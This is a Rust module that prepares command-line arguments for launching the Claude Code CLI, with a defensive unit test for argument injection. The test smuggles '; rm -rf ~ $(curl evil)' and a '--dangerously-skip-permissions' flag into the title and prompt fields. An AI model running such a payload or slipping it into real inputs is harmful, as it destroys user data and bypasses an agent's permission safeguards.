//! Prepares native Claude Code launches.

use pwf_models::session::{AgentModel, LaunchPrompt, SessionThreadTitle};
use pwf_wire::task::session::{AgentLaunch, AgentProbe};

use super::argv::LaunchArgv;
use crate::session::claude_effort::ClaudeEffort;

const BINARY: &str = "claude";

struct ClaudeLaunchPlan {
    title: SessionThreadTitle,
    model: AgentModel,
    effort: ClaudeEffort,
    prompt: LaunchPrompt,
}

impl From<&AgentLaunch> for ClaudeLaunchPlan {
    fn from(launch: &AgentLaunch) -> Self {
        Self {
            title: launch.title.clone(),
            model: launch.model.clone(),
            effort: launch.effort.into(),
            prompt: launch.prompt.clone(),
        }
    }
}

pub(super) fn probe() -> AgentProbe {
    super::probe(pwf_models::session::Agent::Claude, BINARY)
}

pub(super) fn preview(launch: &AgentLaunch) -> Vec<String> {
    prepare_argv(launch)
}

pub(super) fn prepare(launch: &AgentLaunch) -> Vec<String> {
    prepare_argv(launch)
}

fn prepare_argv(launch: &AgentLaunch) -> Vec<String> {
    let ClaudeLaunchPlan {
        title,
        model,
        effort,
        prompt,
    } = ClaudeLaunchPlan::from(launch);
    let mut argv = LaunchArgv::new(BINARY).flag("--name", title.to_string());
    if let Some(model) = model.into_inner() {
        argv = argv.flag("--model", model);
    }
    argv = argv.flag("--effort", effort.as_str().to_string());
    argv.into_guarded(prompt.to_string())
}

#[cfg(test)]
mod tests {
    use pwf_models::{
        session::{
            Agent, AgentModel, LaunchPrompt, SessionEffort, SessionThreadTitle,
            SessionWorkingDirectory,
        },
        task::TaskId,
    };
    use pwf_wire::task::session::AgentLaunch;

    use super::prepare;

    #[test]
    fn prepares_native_name_optional_model_and_hostile_values_as_separate_arguments() {
        let launch = AgentLaunch {
            agent: Agent::Claude,
            task_id: TaskId::try_new("PWF-0038").unwrap(),
            title: SessionThreadTitle::new("--dangerously-skip-permissions".to_string()),
            project_path: SessionWorkingDirectory::new("/projects/pwf".to_string()),
            prompt: LaunchPrompt::new(
                "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
            ),
            model: AgentModel::from(Some("sonnet".to_string())),
            effort: SessionEffort::XHigh,
        };

        let prepared = prepare(&launch);

        assert_eq!(
            prepared,
            vec![
                "claude".to_string(),
                "--name".to_string(),
                "--dangerously-skip-permissions".to_string(),
                "--model".to_string(),
                "sonnet".to_string(),
                "--effort".to_string(),
                "xhigh".to_string(),
                "--".to_string(),
                "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
            ]
        );
    }
}
